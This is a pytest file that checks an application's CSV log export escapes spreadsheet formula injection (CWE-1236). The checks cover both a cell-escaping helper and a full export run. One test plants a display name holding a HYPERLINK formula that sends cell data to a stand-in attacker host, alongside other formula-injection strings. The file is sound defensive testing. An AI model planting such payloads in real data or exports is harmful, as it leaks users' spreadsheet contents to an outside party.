"""SEC-10 (defence in depth): the log export never hands Excel a formula (CSV / formula injection, CWE-1236)."""
import pytest

from app.api.manage import _cell
from app.audit import audit
from app.models import AgentMapping


def test_cells_that_would_be_formulas_are_text():
    for bad in ("=HYPERLINK(\"http://x\")", "+1+1", "-2+3", "@SUM(A1)", "\t=1", "\r=1"):
        assert _cell(bad) == "'" + bad
    for ok in ("2026-10-26 10:00:00", "info", "Anna", "", None, 5, "a=b"):
        assert _cell(ok) == ("" if ok is None else str(ok))


@pytest.mark.asyncio
async def test_export_with_a_formula_name(env):
    async with env.services.db.sessionmaker() as s:
        (await s.get(AgentMapping, 2)).display_name = '=HYPERLINK("http://evil.example/?"&A1,"x")'
        audit(s, "manual_state", agent_id=2, actor_type="agent", actor_id=2, new="ready")
        await s.commit()
    root = await env.login("root")
    r = await env.client.get("/api/log.csv", headers=root)
    assert r.status_code == 200
    assert "'=HYPERLINK" in r.text
    for line in r.text.splitlines()[1:]:
        for cell in line.split(";"):
            assert not cell.strip('"').startswith("="), line
